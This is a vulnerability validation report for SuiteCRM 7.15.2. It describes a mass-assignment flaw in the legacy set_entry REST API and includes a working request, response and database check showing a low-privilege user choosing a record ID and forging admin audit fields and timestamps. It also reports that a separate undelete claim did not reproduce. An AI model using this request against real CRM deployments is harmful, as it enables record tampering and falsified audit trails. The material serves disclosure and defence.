# VULN-077 — Legacy `set_entry`/`set_entries`: unbounded property mass-assignment

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED (Part A — chosen-id insert + audit-field forgery); undelete sub-claim tested and NOT reproduced (see below)
**Severity (static)**: Medium (CVSS 3.1 6.5 — `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`)
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: see `run.log`

## Preconditions
- Low-priv user `mod_f1c0df4f` (id `8b9f9dfc-0bd8-45f9-b862-07125cc0bbde`), given a throwaway Role
  denying only `Accounts` `delete` (used for Part B's control; Part A needs no ACL setup at all —
  default `Save` access is ALL for everyone).
- Admin user id resolved as `1` (classic SuiteCRM admin id, confirmed via `SELECT id FROM users
  WHERE user_name='admin'`).

## Request (Part A — the confirmed capability)
```
POST /service/v4_1/rest.php
method=set_entry&input_type=JSON&response_type=JSON&rest_data=
  ["<low-priv session>","Accounts",[
    {"name":"id","value":"89caf3bf-0636-4a41-91b0-23d225bc16e4"},
    {"name":"new_with_id","value":"1"},
    {"name":"name","value":"Stage10 VULN-077 acct_077150ce"},
    {"name":"set_created_by","value":"0"},{"name":"created_by","value":"1"},
    {"name":"update_modified_by","value":"0"},{"name":"modified_user_id","value":"1"},
    {"name":"update_date_modified","value":"0"},
    {"name":"date_modified","value":"2000-01-01 00:00:00"},
    {"name":"date_entered","value":"2000-01-01 00:00:00"}
  ]]
```
(`request.http`)

## Response
```json
{"id":"89caf3bf-0636-4a41-91b0-23d225bc16e4","entry_list":{
  "id":{"value":"89caf3bf-0636-4a41-91b0-23d225bc16e4"},
  "name":{"value":"Stage10 VULN-077 acct_077150ce"},
  "created_by":{"value":"1"},"modified_user_id":{"value":"1"},
  "date_modified":{"value":"2000-01-01 00:00:00"},"date_entered":{"value":"2000-01-01 00:00:00"}}}
```
**DB row** (`SELECT id, name, created_by, modified_user_id, date_entered, date_modified FROM
accounts WHERE id='89caf3bf-0636-4a41-91b0-23d225bc16e4'`):
```
id=89caf3bf-0636-4a41-91b0-23d225bc16e4  created_by=1  modified_user_id=1
date_entered=2000-01-01 00:00:00  date_modified=2000-01-01 00:00:00
```
— every forged value landed exactly as requested, verified independent of the API's own echo.
`created_by`/`modified_user_id` = `1` (admin) even though the caller was the low-priv user
`8b9f9dfc-...`, and the primary key is the attacker-chosen GUID, not a fresh `create_guid()` value.

## Observation
Part A matches the static finding precisely: the populate loop
(`service/core/SugarWebServiceImpl.php:480-492`) has no `field_defs` boundary, so
`new_with_id`/`set_created_by`/`update_modified_by`/`update_date_modified` — none of which are
real business fields, all of them `SugarBean` save-time control flags — are client-settable, and
`data/SugarBean.php:2346/2358/2373` honor them exactly as described.

## Part B — undelete sub-claim: tested, did NOT reproduce (honest correction)
The static finding also claims "`deleted=0` is unchecked... so a soft-deleted row can be
undeleted." Dynamically testing this specifically:
1. **Control**: low-priv (Role denies `Accounts` `delete`) attempts `deleted=1` on a fresh record
   → correctly **blocked** (`{"name":"Access Denied","description":"You do not have access"}`),
   DB confirms `deleted` stayed `0`. This matches the code: the Delete-ACL branch does fire when
   the *target* value is `1`.
2. **Main test**: admin soft-deletes record Y (`deleted=1`, DB-confirmed). The same low-priv user
   (still `Accounts` `delete`=NONE) sends `deleted=0` for Y. The API call is **not blocked** and
   the response **echoes** `"deleted":{"value":0}` — but the live DB row for Y **still shows
   `deleted=1`** afterward.
3. **Root cause, found by reading the actual persistence path**:
   `include/database/DBManager.php:2070-2073` (`updateSQL()`):
   ```php
   // no need to clear deleted since we only update not deleted records anyway
   if ($fieldDef['name'] == 'deleted' && empty($bean->deleted)) {
       continue;
   }
   ```
   The UPDATE statement **silently omits the `deleted` column** whenever the bean's new value is
   falsy. The comment's assumption ("we only update not deleted records anyway") is actually false
   in this exact scenario — `SugarBean::retrieve($id, true, true)`'s default `$deleted=true`
   parameter *does* fetch already-deleted rows (confirmed at `data/SugarBean.php:4600`) — but
   `updateSQL()` was never updated to match, so the write is a no-op. The missing ACL check on the
   populate-loop path (`SugarWebServiceImpl.php`'s post-populate `$seed->deleted==1` check) is real
   and exactly as described, but it has **no reachable effect for the "undelete" impact**
   specifically, because a separate, unrelated guard prevents the SQL from ever changing the column
   when going 1→0. **Conclusion: the undelete sub-claim does not hold against this commit; the
   chosen-id + audit-field-forgery capability (Part A) is the real, exploitable core of this
   finding.**

## Side effects
1 throwaway low-priv user, 1 throwaway Role (Accounts delete=NONE), 3 Account records (the
attacker-controlled-id one, W, Y) — all random-suffixed. No destructive changes to any pre-existing
data.

## Research & references
CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes) / CWE-472
(External Control of Assumed-Immutable Web Parameter). OWASP — Mass Assignment Cheat Sheet:
https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
